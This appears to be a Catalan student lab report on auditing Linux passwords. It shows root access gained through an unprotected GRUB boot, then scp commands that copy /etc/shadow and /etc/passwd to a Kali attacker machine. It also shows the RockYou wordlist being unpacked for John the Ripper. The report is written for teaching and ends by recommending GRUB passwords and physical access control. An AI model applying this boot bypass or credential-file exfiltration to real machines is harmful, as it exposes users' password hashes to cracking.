# Informe d'Auditoria de Seguretat — Cracking de Contrasenyes en Linux

## 1. Objectiu

Auditar la seguretat de les contrasenyes dels usuaris d'una màquina virtual Ubuntu Server, simulant un atac en dues fases:

1. Aconseguir accés com a `root` a la màquina víctima per extreure els arxius `/etc/passwd` i `/etc/shadow`.
2. Crackejar les contrasenyes usant **John the Ripper** (`Johnny`) des de Kali Linux.

---

## 2. Configuració de l'escenari

- Màquina víctima: Ubuntu Server (OVA importada), interfície de xarxa en mode **NAT**.
- Màquina atacant: Kali Linux 2, interfície de xarxa també en mode **NAT**, a la mateixa subxarxa que la víctima.

![Cap1](/Img/1.png)

![Cap2](/Img/2.png)
---

## 3. Fase 1 — Accés com a root a la màquina víctima

Vaig reiniciar la màquina Ubuntu Server i vaig accedir com a `root` aprofitant l'absència de protecció a l'arrencada de GRUB (edició de paràmetres d'arrencada per obtenir una shell amb privilegis).

![Cap3](/Img/3.png)

### 3.1 Exfiltració d'arxius

Com que es tracta d'un servidor accessible per SSH, es va fer servir `scp` per transferir els arxius crítics a la màquina Kali:

```bash
scp /etc/shadow kali@10.2.0.15:.
scp /etc/passwd kali@10.2.0.15:.
```
![Cap4](/Img/4.png)
![Cap5](/Img/5.png)

> ⚠️ En accedir com a root es té control total de la màquina. Això demostra que protegir només amb contrasenya d'usuari no n'hi ha prou; calen capes addicionals:
> - Control d'accés físic a la màquina.
> - Contrasenya al GRUB per evitar aquest tipus d'atac.

---

## 4. Fase 2 — Cracking de contrasenyes amb John the Ripper

### 4.1 Descompressió del diccionari RockYou

El diccionari `rockyou.txt` ve integrat per defecte a Kali, però es troba comprimit en format `.gz` per estalviar espai. Cal descomprimir-lo abans del primer ús:

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

![Cap6](/Img/6.png)